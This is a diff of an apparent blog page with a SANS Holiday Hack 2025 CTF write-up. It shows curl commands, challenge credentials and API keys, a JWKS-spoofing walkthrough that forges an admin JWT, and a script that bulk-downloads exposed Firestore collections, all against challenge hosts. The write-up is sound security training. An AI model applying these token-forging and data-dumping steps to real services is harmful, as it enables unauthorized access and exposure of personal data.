@@ -32,7 +32,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/localhost:1313\/articles\/write-ups\/sans-holiday-hack-2025\/"
-        },"genre": "articles","wordcount":  292 ,
+        },"genre": "articles","wordcount":  1480 ,
         "url": "http:\/\/localhost:1313\/articles\/write-ups\/sans-holiday-hack-2025\/","datePublished": "2025-11-11T00:00:00+00:00","dateModified": "2025-11-11T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -78,6 +78,14 @@
 </header><main class="main">
                 <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">SANS Holiday Hack Challenge™ 2025</h1><div class="content" id="content"><h2 id="sans-holiday-hack-challenge-2025">SANS Holiday Hack Challenge™ 2025</h2>
 <p>This post will include some of my favorite challenges from the 2025 HHC.</p>
+<h3 id="quick-links">Quick Links</h3>
+<ul>
+<li><a href="#neighborhood-watch-bypass" rel="">Neighborhood Watch Bypass</a></li>
+<li><a href="#mail-detective" rel="">Mail Detective</a></li>
+<li><a href="#idorable-bistro" rel="">IDORable Bistro</a></li>
+<li><a href="#rogue-gnome-identity-provider" rel="">Rogue Gnome Identity Provider</a></li>
+<li><a href="#gnome-tea" rel="">Gnome Tea</a></li>
+</ul>
 <h3 id="neighborhood-watch-bypass">Neighborhood Watch Bypass</h3>
 <p>The challenge involves privesc from a linux box. Let&rsquo;s start with everyone&rsquo;s favorite sudo -l command.
 <a class="lightgallery" href="/assets/HHC/HHC_sudo_l.png" title="sudo -l" data-thumbnail="/assets/HHC/HHC_sudo_l.png">
@@ -143,7 +151,7 @@ Let&rsquo;s pipe the output to a file using &lsquo;2&gt;&amp;1&rsquo; which redi
             alt="spam.txt" width="1200" />
     </a></p>
 <h3 id="idorable-bistro">IDORable Bistro</h3>
-<p>Opening the challenge we get a link to <a href="https://its-idorable.holidayhackchallenge.com/" target="_blank" rel="noopener noreffer ">https://its-idorable.holidayhackchallenge.com/</a>, view page source to find an example receipt URI (/receipt/a1b2c3d4). Quick calculations of IDORing the a1b2c3d4 string would take 4,569,760,000, so it is probably not that. If we view the receipt with the network tab open we find an API request.
+<p>Opening the challenge we get a link to <a href="https://its-idorable.holidayhackchallenge.com/" target="_blank" rel="noopener noreffer ">https://its-idorable.holidayhackchallenge.com/</a>, view page source to find an example receipt URI (/receipt/a1b2c3d4). Quick calculations of IDORing the a1b2c3d4 string would take 4,569,760,000 attempts, so it is probably not that. If we view the receipt with the network tab open we find an API request.
 <a class="lightgallery" href="/assets/HHC/network.png" title="network tab" data-thumbnail="/assets/HHC/network.png">
         <img
             class="lazyload"
@@ -179,6 +187,313 @@ We can see the endpoint id= is vulnerable to IDORable. Let&rsquo;s write a quick
 </span></span><span class="line"><span class="cl"><span class="k">done</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Done. Valid receipts saved to </span><span class="nv">$output_file</span><span class="s2">.&#34;</span></span></span></code></pre></div></div>
+<p>Run the script and read through the results to find the flag!</p>
+<h3 id="rogue-gnome-identity-provider">Rogue Gnome Identity Provider</h3>
+<p>This challenge invovled JWKS spoofing, this was my first time working with JWT, I found this <a href="https://www.youtube.com/watch?v=KUyuvnez0ks" target="_blank" rel="noopener noreffer ">YouTube video from PinkDraconian</a> very helpful.</p>
+<p>We land on the box and find a helpful notes section</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1"># Sites</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Captured Gnome:</span>
+</span></span><span class="line"><span class="cl">curl http://gnome-48371.atnascorp/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## ATNAS Identity Provider (IdP):</span>
+</span></span><span class="line"><span class="cl">curl http://idp.atnascorp/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## My CyberChef website:</span>
+</span></span><span class="line"><span class="cl">curl http://paulweb.neighborhood/
+</span></span><span class="line"><span class="cl"><span class="c1">### My CyberChef site html files:</span>
+</span></span><span class="line"><span class="cl">~/www/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Credentials</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Gnome credentials (found on a post-it):</span>
+</span></span><span class="line"><span class="cl">Gnome:SittingOnAShelf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Curl Commands Used in Analysis of Gnome:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Gnome Diagnostic Interface authentication required page:</span>
+</span></span><span class="line"><span class="cl">curl http://gnome-48371.atnascorp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Request IDP Login Page</span>
+</span></span><span class="line"><span class="cl">curl http://idp.atnascorp/?return_uri<span class="o">=</span>http%3A%2F%2Fgnome-48371.atnascorp%2Fauth
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Authenticate to IDP</span>
+</span></span><span class="line"><span class="cl">curl -X POST --data-binary <span class="s1">$&#39;username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth&#39;</span> http://idp.atnascorp/login
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Pass Auth Token to Gnome</span>
+</span></span><span class="line"><span class="cl">curl -v http://gnome-48371.atnascorp/auth?token<span class="o">=</span>&lt;insert-JWT&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Access Gnome Diagnostic Interface</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s1">&#39;Cookie: session=&lt;insert-session&gt;&#39;</span> http://gnome-48371.atnascorp/diagnostic-interface
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Analyze the JWT</span>
+</span></span><span class="line"><span class="cl">jwt_tool.py &lt;insert-JWT&gt;
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Done. Valid receipts saved to </span><span class="nv">$output_file</span><span class="s2">.&#34;</span></span></span></code></pre></div></div>
+<p>We start by authenticating to the IDP with the credentials we already have.
+<code>curl -X POST --data-binary $'username=gnome&amp;password=SittingOnAShelf&amp;return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login</code>
+<a class="lightgallery" href="/assets/HHC/init_jwt.png" title="Initial JWT" data-thumbnail="/assets/HHC/init_jwt.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/init_jwt.png"
+            data-srcset="/assets/HHC/init_jwt.png, /assets/HHC/init_jwt.png 1.5x, /assets/HHC/init_jwt.png 2x"
+            data-sizes="auto"
+            alt="Initial JWT" width="1200" />
+    </a>
+Next we take the token and we can decode it to see the decoded header and payload using <a href="https://www.jwt.io/" target="_blank" rel="noopener noreffer ">jwt.io/</a>.
+<a class="lightgallery" href="/assets/HHC/init_decode.png" title="Decoded JWT" data-thumbnail="/assets/HHC/init_decode.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/init_decode.png"
+            data-srcset="/assets/HHC/init_decode.png, /assets/HHC/init_decode.png 1.5x, /assets/HHC/init_decode.png 2x"
+            data-sizes="auto"
+            alt="Decoded JWT" width="1200" />
+    </a>
+We can identify a URL we have not seen before and a kid which maybe useful later. Let&rsquo;s curl the URL to find what it contains.
+<a class="lightgallery" href="/assets/HHC/jwks_json.png" title="jwks.json" data-thumbnail="/assets/HHC/jwks_json.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/jwks_json.png"
+            data-srcset="/assets/HHC/jwks_json.png, /assets/HHC/jwks_json.png 1.5x, /assets/HHC/jwks_json.png 2x"
+            data-sizes="auto"
+            alt="jwks.json" width="1200" />
+    </a>
+Let&rsquo;s now see if we can get the IDP to make a request to our site to see if we can force it to use our jwks.json file. Take the first portion of the JWT and base64 decode it then modify the JKU to a URI on our site.
+<a class="lightgallery" href="/assets/HHC/crap123.png" title="Access log" data-thumbnail="/assets/HHC/crap123.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/crap123.png"
+            data-srcset="/assets/HHC/crap123.png, /assets/HHC/crap123.png 1.5x, /assets/HHC/crap123.png 2x"
+            data-sizes="auto"
+            alt="Access log" width="1200" />
+    </a>
+We now know we can modify the rest of the JWT and have it reach out to our site to fetch the JWKS. We need to keep the <code>kid</code> the same, but we want to change the <code>jku</code> to a URI on our site, we also want to change the admin flag from false to true. Again modify the JWT using base64 decode, change the affected areas, and base64 encode.
+<a class="lightgallery" href="/assets/HHC/new_token.png" title="New token" data-thumbnail="/assets/HHC/new_token.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/new_token.png"
+            data-srcset="/assets/HHC/new_token.png, /assets/HHC/new_token.png 1.5x, /assets/HHC/new_token.png 2x"
+            data-sizes="auto"
+            alt="New token" width="1200" />
+    </a>
+Now we need to create a JSON Web Key (JWK) similar to the one found at <code>http://idp.atnascorp/.well-known/jwks.json</code>. I used <a href="https://mkjwk.org/" target="_blank" rel="noopener noreffer ">mkjwk.org</a> ensuring everything matched the information found at jwks.json.
+<a class="lightgallery" href="/assets/HHC/mwjwk.png" title="JWK generation" data-thumbnail="/assets/HHC/mwjwk.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/mwjwk.png"
+            data-srcset="/assets/HHC/mwjwk.png, /assets/HHC/mwjwk.png 1.5x, /assets/HHC/mwjwk.png 2x"
+            data-sizes="auto"
+            alt="JWK generation" width="1200" />
+    </a>
+Take the public key we generated and place it on our webserver at jwks.json. Make sure we match the legit IDP syntax, I pasted everything as a oneliner as spaces might cause issues.
+<a class="lightgallery" href="/assets/HHC/jwks_attacker.png" title="jwks.json spoofed" data-thumbnail="/assets/HHC/jwks_attacker.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/jwks_attacker.png"
+            data-srcset="/assets/HHC/jwks_attacker.png, /assets/HHC/jwks_attacker.png 1.5x, /assets/HHC/jwks_attacker.png 2x"
+            data-sizes="auto"
+            alt="jwks.json spoofed" width="1200" />
+    </a>
+Almost done&hellip; we now need to convert the public and private keypair and convert it to a pem file, I used <a href="8gwifi.org" rel="">https://8gwifi.org/jwkconvertfunctions.jsp</a>. Copy the private key and save it on the machine. Now we want to take our modified JWT (admin:true &amp; our jku URL) and sign it with our private key we just generated.
+<code>python3 /usr/local/bin/jwt_tool.py -S rs256 -pr priv.key &lt;key_here&gt;</code>
+<a class="lightgallery" href="/assets/HHC/jwt_final.png" title="Final jwt" data-thumbnail="/assets/HHC/jwt_final.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/jwt_final.png"
+            data-srcset="/assets/HHC/jwt_final.png, /assets/HHC/jwt_final.png 1.5x, /assets/HHC/jwt_final.png 2x"
+            data-sizes="auto"
+            alt="Final jwt" width="1200" />
+    </a>
+Authenticate with the token <code>curl -v 'http://gnome-48371.atnascorp/auth?token=token'</code> to get a cookie.
+<a class="lightgallery" href="/assets/HHC/cookie.png" title="Admin authentication" data-thumbnail="/assets/HHC/cookie.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/cookie.png"
+            data-srcset="/assets/HHC/cookie.png, /assets/HHC/cookie.png 1.5x, /assets/HHC/cookie.png 2x"
+            data-sizes="auto"
+            alt="Admin authentication" width="1200" />
+    </a>
+Then authenticate to the diagnostic-interface using the cookie to get admin!
+<a class="lightgallery" href="/assets/HHC/admin_access.png" title="Diagnostic-interface access" data-thumbnail="/assets/HHC/admin_access.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/admin_access.png"
+            data-srcset="/assets/HHC/admin_access.png, /assets/HHC/admin_access.png 1.5x, /assets/HHC/admin_access.png 2x"
+            data-sizes="auto"
+            alt="Diagnostic-interface access" width="1200" />
+    </a></p>
+<h3 id="gnome-tea">Gnome Tea</h3>
+<p>This one is actually really funny and is making fun of the vibe-coded &lsquo;Tea&rsquo; dating/doxxing app which was built with no security considerations and led to leaking of users drivers licenses due to unsecured public databases. The goal of the challenge is to login as ??.
+The challenge starts at <code>https://gnometea.web.app/login</code> and based on error messages we quickly find out it is a firebase application. After poking around we find some quick clues - page source shows <code>&lt;!-- TODO: lock down dms, tea, gnomes collections --&gt;</code>. It took me a while to find the next step but in sources we find a .js file containing a firebase configuration.
+<a class="lightgallery" href="/assets/HHC/firebase_config.png" title="Firebase configuration" data-thumbnail="/assets/HHC/firebase_config.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/firebase_config.png"
+            data-srcset="/assets/HHC/firebase_config.png, /assets/HHC/firebase_config.png 1.5x, /assets/HHC/firebase_config.png 2x"
+            data-sizes="auto"
+            alt="Firebase configuration" width="1200" />
+    </a>
+Next we list the bucket that we found using the storageBucket and API key we found <code>curl &quot;https://firebasestorage.googleapis.com/v0/b/holidayhack2025.firebasestorage.app/o?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk&quot;</code> We find a bunch of profile pictures and drivers licenses
+<a class="lightgallery" href="/assets/HHC/curl_dls.png" title="Default bucket curl" data-thumbnail="/assets/HHC/curl_dls.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/curl_dls.png"
+            data-srcset="/assets/HHC/curl_dls.png, /assets/HHC/curl_dls.png 1.5x, /assets/HHC/curl_dls.png 2x"
+            data-sizes="auto"
+            alt="Default bucket curl" width="1200" />
+    </a>
+I use Cursor to quickly create a script to download all files from the bucket. We now have lots of gnomes profile pics and driver licenses.
+<a class="lightgallery" href="/assets/HHC/gnomes.png" title="Gnomes leaked" data-thumbnail="/assets/HHC/gnomes.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/gnomes.png"
+            data-srcset="/assets/HHC/gnomes.png, /assets/HHC/gnomes.png 1.5x, /assets/HHC/gnomes.png 2x"
+            data-sizes="auto"
+            alt="Gnomes leaked" width="1200" />
+    </a>
+Unfortunately, we do not have any info that might help us login. If we view the <a href="https://firebase.google.com/docs/firestore/use-rest-api" target="_blank" rel="noopener noreffer ">Cloud Firestore REST API docs</a> we find the URL <code>https://firestore.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/cities/LA</code> Some asking Cursor for help shows that we should add <code>?key=&lt;key&gt;</code> on the end of the URL. We can try the following URLs based on the TODO note we found earlier.
+<code>curl &quot;https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/dms?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk&quot;</code></p>
+<p><code>curl &quot;https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/tea?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk&quot;</code></p>
+<p><code>curl  &quot;https://firestore.googleapis.com/v1/projects/holidayhack2025/databases/(default)/documents/gnomes?key=AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk&quot;</code></p>
+<p>They all return information, lets have Cursor write us a script to download all files.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Firestore Collection Download Script</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Downloads data from Firestore collections and saves to organized subfolders</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">API_KEY</span><span class="o">=</span><span class="s2">&#34;AIzaSyDvBE5-77eZO8T18EiJ_MwGAYo5j2bqhbk&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PROJECT_ID</span><span class="o">=</span><span class="s2">&#34;holidayhack2025&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">BASE_URL</span><span class="o">=</span><span class="s2">&#34;https://firestore.googleapis.com/v1/projects/</span><span class="si">${</span><span class="nv">PROJECT_ID</span><span class="si">}</span><span class="s2">/databases/(default)/documents&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">OUTPUT_DIR</span><span class="o">=</span><span class="s2">&#34;firebase_output&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Collections to download</span>
+</span></span><span class="line"><span class="cl"><span class="nv">COLLECTIONS</span><span class="o">=(</span><span class="s2">&#34;dms&#34;</span> <span class="s2">&#34;tea&#34;</span> <span class="s2">&#34;gnomes&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Create main output directory</span>
+</span></span><span class="line"><span class="cl">mkdir -p <span class="s2">&#34;</span><span class="nv">$OUTPUT_DIR</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Downloading Firestore collections...&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Loop through each collection</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> collection in <span class="s2">&#34;</span><span class="si">${</span><span class="nv">COLLECTIONS</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Create subfolder for this collection</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">collection_dir</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">OUTPUT_DIR</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">collection</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    mkdir -p <span class="s2">&#34;</span><span class="nv">$collection_dir</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Downloading collection: </span><span class="nv">$collection</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Download the collection data</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">url</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">BASE_URL</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">collection</span><span class="si">}</span><span class="s2">?key=</span><span class="si">${</span><span class="nv">API_KEY</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">output_file</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">collection_dir</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">collection</span><span class="si">}</span><span class="s2">.json&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Fetch the data</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">response</span><span class="o">=</span><span class="k">$(</span>curl -s <span class="s2">&#34;</span><span class="nv">$url</span><span class="s2">&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Check if we got a valid response</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$response</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$response</span><span class="s2">&#34;</span> <span class="p">|</span> grep -q <span class="s2">&#34;error&#34;</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;  ✗ Error fetching </span><span class="nv">$collection</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$response</span><span class="s2">&#34;</span> &gt; <span class="s2">&#34;</span><span class="si">${</span><span class="nv">collection_dir</span><span class="si">}</span><span class="s2">/error.json&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Save the JSON response</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$response</span><span class="s2">&#34;</span> &gt; <span class="s2">&#34;</span><span class="nv">$output_file</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;  ✓ Saved to: </span><span class="nv">$output_file</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1"># If jq is available, try to extract individual documents</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">command</span> -v jq <span class="p">&amp;</span>&gt; /dev/null<span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># Check if there are documents in the response</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">doc_count</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$response</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.documents | length&#39;</span> 2&gt;/dev/null <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&#34;0&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$doc_count</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;0&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$doc_count</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;null&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">echo</span> <span class="s2">&#34;  Found </span><span class="nv">$doc_count</span><span class="s2"> document(s), extracting...&#34;</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">                <span class="c1"># Extract each document</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$response</span><span class="s2">&#34;</span> <span class="p">|</span> jq -c <span class="s1">&#39;.documents[]&#39;</span> 2&gt;/dev/null <span class="p">|</span> <span class="k">while</span> <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> -r doc<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1"># Get document ID from the name field</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">doc_id</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$doc</span><span class="s2">&#34;</span> <span class="p">|</span> jq -r <span class="s1">&#39;.name&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s|.*/||&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">                    
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">[</span> -n <span class="s2">&#34;</span><span class="nv">$doc_id</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$doc_id</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;null&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">                        <span class="nv">doc_file</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">collection_dir</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">doc_id</span><span class="si">}</span><span class="s2">.json&#34;</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$doc</span><span class="s2">&#34;</span> <span class="p">|</span> jq <span class="s1">&#39;.&#39;</span> &gt; <span class="s2">&#34;</span><span class="nv">$doc_file</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">echo</span> <span class="s2">&#34;    ✓ Extracted: </span><span class="nv">$doc_id</span><span class="s2">.json&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">                <span class="k">done</span>
+</span></span><span class="line"><span class="cl">            <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
+</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Download complete! Files saved to: </span><span class="si">${</span><span class="nv">OUTPUT_DIR</span><span class="si">}</span><span class="s2">/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;  - </span><span class="si">${</span><span class="nv">OUTPUT_DIR</span><span class="si">}</span><span class="s2">/dms/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;  - </span><span class="si">${</span><span class="nv">OUTPUT_DIR</span><span class="si">}</span><span class="s2">/tea/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;  - </span><span class="si">${</span><span class="nv">OUTPUT_DIR</span><span class="si">}</span><span class="s2">/gnomes/&#34;</span></span></span></code></pre></div></div>
+<p>Let&rsquo;s go to the dm&rsquo;s and search for password, sure enough Barnaby Briefcase has given us a hint.
+<a class="lightgallery" href="/assets/HHC/barnaby.png" title="Barnaby&rsquo;s password hint" data-thumbnail="/assets/HHC/barnaby.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/barnaby.png"
+            data-srcset="/assets/HHC/barnaby.png, /assets/HHC/barnaby.png 1.5x, /assets/HHC/barnaby.png 2x"
+            data-sizes="auto"
+            alt="Barnaby&rsquo;s password hint" width="1200" />
+    </a>
+Now we can run exiftool on Barnaby&rsquo;s drivers license to get the lat/long where he took the picture. We can convert the lat/long to decimal using <a href="https://latlongdata.com/lat-long-converter/" target="_blank" rel="noopener noreffer ">latlongdata.com</a>, then we can put the decimal deegrees into Google Maps.
+<a class="lightgallery" href="/assets/HHC/gnomesville.png" title="Google maps location" data-thumbnail="/assets/HHC/gnomesville.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/gnomesville.png"
+            data-srcset="/assets/HHC/gnomesville.png, /assets/HHC/gnomesville.png 1.5x, /assets/HHC/gnomesville.png 2x"
+            data-sizes="auto"
+            alt="Google maps location" width="1200" />
+    </a>
+Pretty obvious what the password is going to be now we just need to find Barnaby&rsquo;s email in the gnomes data folder and then we can login with <code>barnabybriefcase@gnomemail.dosis:gnomesville</code>
+The last hint for this challenge reads <code>Hopefully they did not rely on hard-coded client-side controls to validate admin access once a user validly logs in. If so, it might be pretty easy to change some variable in the developer console to bypass these controls.</code> Searching the sources .js file again for <code>admin</code> reveals the /admin endpoint.
+<a class="lightgallery" href="/assets/HHC/admin_uri.png" title="Admin URI" data-thumbnail="/assets/HHC/admin_uri.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/admin_uri.png"
+            data-srcset="/assets/HHC/admin_uri.png, /assets/HHC/admin_uri.png 1.5x, /assets/HHC/admin_uri.png 2x"
+            data-sizes="auto"
+            alt="Admin URI" width="1200" />
+    </a>
+Continuing searching through the js file for admin shows us a hardcoded string that we can use to become admin.
+<a class="lightgallery" href="/assets/HHC/f.png" title="f string" data-thumbnail="/assets/HHC/f.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/HHC/f.png"
+            data-srcset="/assets/HHC/f.png, /assets/HHC/f.png 1.5x, /assets/HHC/f.png 2x"
+            data-sizes="auto"
+            alt="f string" width="1200" />
+    </a>
